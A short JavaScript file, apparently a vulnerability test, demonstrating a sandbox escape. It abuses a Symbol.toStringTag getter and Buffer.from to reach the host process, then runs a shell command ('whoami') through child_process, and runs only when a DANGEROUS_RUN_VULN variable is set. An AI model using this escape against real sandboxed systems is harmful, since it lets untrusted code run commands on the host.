if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (error.message === "f is not a function") {
		process.exit(82);
	}

	process.exit(1);
});

(function () {
	Symbol = {
		get toStringTag() {
			throw (f) => f.constructor("return process")();
		},
	};
	try {
		Buffer.from(new Map());
	} catch (f) {
		Symbol = {};
		return f(() => {})
			.mainModule.require("child" + "_process")
			.execSync("whoami")
			.toString();
	}
})();
